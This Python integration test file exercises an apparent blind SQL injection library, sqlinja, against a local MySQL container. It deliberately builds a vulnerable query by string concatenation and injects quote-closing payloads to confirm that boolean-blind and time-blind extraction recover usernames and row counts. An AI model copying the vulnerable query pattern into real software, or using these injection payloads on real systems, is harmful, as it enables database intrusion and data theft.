#!/usr/bin/env python3
"""Integration tests for MySqlConfig against a real MySQL server.

Requires mysql-connector-python (see requirements-dev.txt) and a reachable
MySQL instance, e.g.:

    docker run -d --name sqlinja-mysql \\
        -e MYSQL_ROOT_PASSWORD=test -e MYSQL_DATABASE=sqlinja_test \\
        -p 3306:3306 mysql:8

Connection is configurable via env vars (defaults match the command above):
    SQLINJA_MYSQL_HOST (default 127.0.0.1)
    SQLINJA_MYSQL_PORT (default 3306)
    SQLINJA_MYSQL_USER (default root)
    SQLINJA_MYSQL_PASSWORD (default test)
    SQLINJA_MYSQL_DB (default sqlinja_test)

If the server is unreachable, every test in this module is skipped rather
than failed, so the rest of the suite stays runnable without Docker.
"""

import os
import string
import time
import unittest
from typing import Any

try:
    import mysql.connector
    HAS_DRIVER = True
except ImportError:
    HAS_DRIVER = False

from sqlinja import SqlInja, Mode, MySqlConfig

HOST = os.environ.get("SQLINJA_MYSQL_HOST", "127.0.0.1")
PORT = int(os.environ.get("SQLINJA_MYSQL_PORT", "3306"))
USER = os.environ.get("SQLINJA_MYSQL_USER", "root")
PASSWORD = os.environ.get("SQLINJA_MYSQL_PASSWORD", "test")
DATABASE = os.environ.get("SQLINJA_MYSQL_DB", "sqlinja_test")


def _server_reachable() -> bool:
    if not HAS_DRIVER:
        return False
    try:
        con = mysql.connector.connect(
            host=HOST, port=PORT, user=USER, password=PASSWORD, connection_timeout=3
        )
        con.close()
        return True
    except mysql.connector.Error:
        return False


SKIP_REASON = "mysql-connector-python missing or MySQL server unreachable"
SHOULD_SKIP = not _server_reachable()


@unittest.skipIf(SHOULD_SKIP, SKIP_REASON)
class _MySqlUsersTableTestCase(unittest.TestCase):
    """Shared DB/table lifecycle for MySQL integration tests; each mode's
    exec_request differs, so it stays in the subclass."""

    # the driver is optional, so its types can't be named here
    admin_con: Any
    admin_cur: Any

    @classmethod
    def setUpClass(cls):
        cls.admin_con = mysql.connector.connect(
            host=HOST, port=PORT, user=USER, password=PASSWORD, connection_timeout=5
        )
        cls.admin_cur = cls.admin_con.cursor()
        cls.admin_cur.execute(f"CREATE DATABASE IF NOT EXISTS {DATABASE}")
        cls.admin_con.commit()

    @classmethod
    def tearDownClass(cls):
        cls.admin_cur.execute(f"DROP DATABASE IF EXISTS {DATABASE}")
        cls.admin_con.commit()
        cls.admin_cur.close()
        cls.admin_con.close()

    def setUp(self):
        self.con = mysql.connector.connect(
            host=HOST, port=PORT, user=USER, password=PASSWORD,
            database=DATABASE, connection_timeout=5,
        )
        self.cur = self.con.cursor()
        self.cur.execute(
            "CREATE TABLE Users("
            "Id INT AUTO_INCREMENT PRIMARY KEY, "
            "UserName VARCHAR(255), "
            "LastLoginIP VARCHAR(255))"
        )
        self.cur.executemany(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (%s, %s)",
            [("soham", "10.0.0.1"), ("admin", "10.0.0.2"), ("guest", "10.0.0.3")],
        )
        self.con.commit()

    def tearDown(self):
        self.cur.execute("DROP TABLE Users")
        self.con.commit()
        self.cur.close()
        self.con.close()


class SqlInjaMySqlTestCase(_MySqlUsersTableTestCase):
    """Same vulnerable-route simulation as test_sqlinja.py (raw string
    concatenation, quote-closing injection), but executed against a real
    MySQL server so MySqlConfig's SQL fragments are exercised by the actual
    engine -- this is what catches per-dialect syntax/semantics bugs
    (e.g. the UNICODE('') vs ORD('') NULL-handling divergence that started
    this whole rewrite)."""

    def setUp(self):
        super().setUp()
        self.helper = SqlInja(MySqlConfig(), self.exec_request, mode=Mode.BOOLEAN)
        self.candidates = string.ascii_letters + string.digits

    def run_vulnerable_route(self, user_input: str) -> bool:
        query = "SELECT * FROM Users WHERE LastLoginIP = '" + user_input + "'"
        self.cur.execute(query)
        row = self.cur.fetchone()
        # drain any unread result to keep the connection usable for the next query
        self.cur.fetchall()
        return row is not None

    def exec_request(self, payload: str, sleep_duration: int) -> bool:
        injected = f"nonexistent' OR ({payload}) -- "
        return self.run_vulnerable_route(injected)

    def test_check_detects_existing_row(self):
        self.assertTrue(self.helper.check("SELECT 1"))

    def test_check_detects_missing_row(self):
        self.assertFalse(
            self.helper.check("SELECT UserName FROM Users WHERE Id = 999")
        )

    def test_extract_val_reads_count(self):
        self.assertEqual(
            self.helper.extract_val("SELECT COUNT(*) FROM Users", 0, 100), 3
        )

    def test_extract_until_end_char_reads_cell(self):
        chars = list(
            self.helper.extract_until_end_char(
                "SELECT UserName FROM Users WHERE Id = 1", self.candidates
            )
        )
        self.assertEqual("".join(chars), "soham")

    def test_extract_by_length_reads_cell(self):
        chars = list(
            self.helper.extract_by_length(
                "SELECT UserName FROM Users WHERE Id = 2", self.candidates
            )
        )
        self.assertEqual("".join(chars), "admin")

    def test_extract_by_length_handles_null_value(self):
        # MySQL's ORD('') is 0, not NULL (unlike MSSQL's UNICODE('')) -- but a
        # genuine SQL NULL value must still resolve to an empty extraction.
        self.cur.execute(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (NULL, '10.0.0.4')"
        )
        self.con.commit()
        chars = list(
            self.helper.extract_by_length(
                "SELECT UserName FROM Users WHERE Id = 4", self.candidates
            )
        )
        self.assertEqual(chars, [])

    def test_extract_column_iterates_all_rows(self):
        request_template = "SELECT UserName FROM Users ORDER BY Id {index}"
        users = [
            "".join(cell)
            for cell in self.helper.extract_column(
                request_template, self.candidates, start_index=0
            )
        ]
        self.assertEqual(users, ["soham", "admin", "guest"])


class SqlInjaMySqlTimeModeTestCase(_MySqlUsersTableTestCase):
    """Same vulnerable route, but exec_request never looks at the query
    result -- only at how long the request took, exactly like a real
    time-blind exploitation would need to (no visible output to compare
    against). This is the only way to exercise MySqlConfig.as_time end to
    end: SQLite has no SLEEP/WAITFOR equivalent to test this path with."""

    SLEEP_DURATION = 1

    def setUp(self):
        super().setUp()
        self.helper = SqlInja(
            MySqlConfig(), self.exec_request,
            mode=Mode.TIME, sleep_duration=self.SLEEP_DURATION,
        )

    def run_vulnerable_route(self, user_input: str) -> None:
        query = "SELECT * FROM Users WHERE LastLoginIP = '" + user_input + "'"
        self.cur.execute(query)
        self.cur.fetchall()

    def exec_request(self, payload: str, sleep_duration: int) -> bool:
        injected = f"nonexistent' OR ({payload}) -- "
        start = time.monotonic()
        self.run_vulnerable_route(injected)
        elapsed = time.monotonic() - start
        return elapsed >= sleep_duration

    def test_check_detects_existing_row(self):
        self.assertTrue(self.helper.check("SELECT 1"))

    def test_check_detects_missing_row(self):
        self.assertFalse(
            self.helper.check("SELECT UserName FROM Users WHERE Id = 999")
        )

    def test_extract_val_reads_count(self):
        self.assertEqual(
            self.helper.extract_val("SELECT COUNT(*) FROM Users", 0, 10), 3
        )


if __name__ == "__main__":
    unittest.main()
